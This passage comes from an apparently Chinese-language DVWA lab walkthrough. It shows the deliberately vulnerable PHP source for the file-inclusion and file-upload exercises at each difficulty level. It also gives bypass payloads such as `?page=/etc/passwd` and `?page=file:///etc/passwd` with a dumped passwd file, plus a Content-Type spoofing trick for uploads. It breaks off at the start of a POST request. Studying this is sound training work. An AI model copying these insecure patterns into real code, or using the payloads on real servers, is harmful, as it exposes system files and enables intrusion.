class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// The page we wish to display</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;page&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"variable\">$file</span> != <span class=\"string\">&quot;include.php&quot;</span> &amp;&amp; <span class=\"variable\">$file</span> != <span class=\"string\">&quot;file1.php&quot;</span> &amp;&amp; <span class=\"variable\">$file</span> != <span class=\"string\">&quot;file2.php&quot;</span> &amp;&amp; <span class=\"variable\">$file</span> != <span class=\"string\">&quot;file3.php&quot;</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// This isn&#x27;t the page we want!</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;ERROR: File not found!&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High File Inclusion Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// The page we wish to display</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;page&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Input validation</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( !fnmatch( <span class=\"string\">&quot;file*&quot;</span>, <span class=\"variable\">$file</span> ) &amp;&amp; <span class=\"variable\">$file</span> != <span class=\"string\">&quot;include.php&quot;</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// This isn&#x27;t the page we want!</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;ERROR: File not found!&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium File Inclusion Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// The page we wish to display</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;page&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Input validation</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = str_replace( <span class=\"keyword\">array</span>( <span class=\"string\">&quot;http://&quot;</span>, <span class=\"string\">&quot;https://&quot;</span> ), <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$file</span> );</span><br><span class=\"line\"><span class=\"variable\">$file</span> = str_replace( <span class=\"keyword\">array</span>( <span class=\"string\">&quot;../&quot;</span>, <span class=\"string\">&quot;..\\&quot;&quot;</span> ), <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$file</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low File Inclusion Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// The page we wish to display</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;page&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-4\"><a class=\"markdownIt-Anchor\" href=\"#low-4\"></a> Low</h3>\n<ul>\n<li>GET方法传参，直接修改网址，查看/etc/passwd</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?page=/etc/passwd</span><br><span class=\"line\"></span><br><span class=\"line\">root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:998:996::/var/lib/chrony:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin dockerroot:x:997:994:Docker User:/var/lib/docker:/sbin/nologin </span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-4\"><a class=\"markdownIt-Anchor\" href=\"#medium-4\"></a> Medium</h3>\n<ul>\n<li>\n<p>过滤了 “http://”, “https://”，“…/&quot;,&quot;…\\&quot;</p>\n</li>\n<li>\n<p>可以构造&quot;httphttp://😕/&quot;异形路径</p>\n</li>\n<li>\n<p>同Low等级</p>\n</li>\n</ul>\n<h3 id=\"high-4\"><a class=\"markdownIt-Anchor\" href=\"#high-4\"></a> High</h3>\n<ul>\n<li>\n<p>加入黑名单机制，参数只能以file开头</p>\n</li>\n<li>\n<p>构造参数</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?page=file:///etc/passwd</span><br></pre></td></tr></table></figure>\n<ul>\n<li>使用file协议访问本地文件</li>\n</ul>\n<h2 id=\"file-upload\"><a class=\"markdownIt-Anchor\" href=\"#file-upload\"></a> File Upload</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//File Upload</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible File Upload Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// File information</span></span><br><span class=\"line\">    <span class=\"variable\">$uploaded_name</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_ext</span>  = substr( <span class=\"variable\">$uploaded_name</span>, strrpos( <span class=\"variable\">$uploaded_name</span>, <span class=\"string\">&#x27;.&#x27;</span> ) + <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_size</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;size&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_type</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;type&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_tmp</span>  = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;tmp_name&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Where are we going to be writing to?</span></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class=\"string\">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class=\"line\">    <span class=\"comment\">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class=\"line\">    <span class=\"variable\">$target_file</span>   =  md5( uniqid() . <span class=\"variable\">$uploaded_name</span> ) . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$uploaded_ext</span>;</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span>     = ( ( ini_get( <span class=\"string\">&#x27;upload_tmp_dir&#x27;</span> ) == <span class=\"string\">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class=\"string\">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class=\"variable\">$uploaded_name</span> ) . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$uploaded_ext</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Is it an image?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( ( strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&#x27;jpg&#x27;</span> || strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&#x27;jpeg&#x27;</span> || strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class=\"line\">        ( <span class=\"variable\">$uploaded_size</span> &lt; <span class=\"number\">100000</span> ) &amp;&amp;</span><br><span class=\"line\">        ( <span class=\"variable\">$uploaded_type</span> == <span class=\"string\">&#x27;image/jpeg&#x27;</span> || <span class=\"variable\">$uploaded_type</span> == <span class=\"string\">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class=\"line\">        getimagesize( <span class=\"variable\">$uploaded_tmp</span> ) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( <span class=\"variable\">$uploaded_type</span> == <span class=\"string\">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$img</span> = imagecreatefromjpeg( <span class=\"variable\">$uploaded_tmp</span> );</span><br><span class=\"line\">            imagejpeg( <span class=\"variable\">$img</span>, <span class=\"variable\">$temp_file</span>, <span class=\"number\">100</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$img</span> = imagecreatefrompng( <span class=\"variable\">$uploaded_tmp</span> );</span><br><span class=\"line\">            imagepng( <span class=\"variable\">$img</span>, <span class=\"variable\">$temp_file</span>, <span class=\"number\">9</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        imagedestroy( <span class=\"variable\">$img</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Can we move the file to the web root from the temp folder?</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( rename( <span class=\"variable\">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class=\"variable\">$target_path</span> . <span class=\"variable\">$target_file</span> ) ) ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Yes!</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// No</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Delete any temp files</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( file_exists( <span class=\"variable\">$temp_file</span> ) )</span><br><span class=\"line\">            unlink( <span class=\"variable\">$temp_file</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Invalid file</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High File Upload Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Where are we going to be writing to?</span></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class=\"string\">&quot;hackable/uploads/&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$target_path</span> .= basename( <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// File information</span></span><br><span class=\"line\">    <span class=\"variable\">$uploaded_name</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_ext</span>  = substr( <span class=\"variable\">$uploaded_name</span>, strrpos( <span class=\"variable\">$uploaded_name</span>, <span class=\"string\">&#x27;.&#x27;</span> ) + <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_size</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;size&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_tmp</span>  = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;tmp_name&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Is it an image?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( ( strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&quot;jpg&quot;</span> || strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&quot;jpeg&quot;</span> || strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class=\"line\">        ( <span class=\"variable\">$uploaded_size</span> &lt; <span class=\"number\">100000</span> ) &amp;&amp;</span><br><span class=\"line\">        getimagesize( <span class=\"variable\">$uploaded_tmp</span> ) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Can we move the file to the upload folder?</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( !move_uploaded_file( <span class=\"variable\">$uploaded_tmp</span>, <span class=\"variable\">$target_path</span> ) ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// No</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Yes!</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Invalid file</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium File Upload Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Where are we going to be writing to?</span></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class=\"string\">&quot;hackable/uploads/&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$target_path</span> .= basename( <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// File information</span></span><br><span class=\"line\">    <span class=\"variable\">$uploaded_name</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_type</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;type&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_size</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;size&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Is it an image?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( ( <span class=\"variable\">$uploaded_type</span> == <span class=\"string\">&quot;image/jpeg&quot;</span> || <span class=\"variable\">$uploaded_type</span> == <span class=\"string\">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class=\"line\">        ( <span class=\"variable\">$uploaded_size</span> &lt; <span class=\"number\">100000</span> ) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Can we move the file to the upload folder?</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( !move_uploaded_file( <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;tmp_name&#x27;</span> ], <span class=\"variable\">$target_path</span> ) ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// No</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Yes!</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Invalid file</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low File Upload Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Where are we going to be writing to?</span></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class=\"string\">&quot;hackable/uploads/&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$target_path</span> .= basename( <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Can we move the file to the upload folder?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !move_uploaded_file( <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;tmp_name&#x27;</span> ], <span class=\"variable\">$target_path</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// No</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Yes!</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-5\"><a class=\"markdownIt-Anchor\" href=\"#low-5\"></a> Low</h3>\n<ul>\n<li>随便上传，无限制</li>\n</ul>\n<h3 id=\"medium-5\"><a class=\"markdownIt-Anchor\" href=\"#medium-5\"></a> Medium</h3>\n<ul>\n<li>限制文件类型，但是可以改包上传Content-Type: image/png</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /dvwa/vulnerabilities/upload/ 